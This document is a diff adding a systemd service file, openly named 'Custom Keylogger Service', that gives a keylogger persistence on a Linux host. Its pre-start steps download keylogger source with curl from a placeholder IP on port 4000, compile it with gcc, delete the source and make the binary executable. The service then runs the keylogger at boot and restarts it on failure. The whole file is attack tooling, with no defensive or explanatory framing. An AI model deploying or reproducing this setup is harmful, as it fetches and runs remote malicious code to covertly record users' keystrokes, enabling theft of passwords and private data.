@@ -1,0 +1,15 @@
+[Unit]
+Description=Custom Keylogger Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStartPre=/usr/bin/curl -s http://<ip>:4000/keylogger.c -o /tmp/keylogger.c
+ExecStartPre=/usr/bin/gcc -o /tmp/keylogger /tmp/keylogger.c -lpthread
+ExecStartPre=/bin/rm /tmp/keylogger.c
+ExecStartPre=/bin/chmod +x /tmp/keylogger
+ExecStart=/tmp/keylogger
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
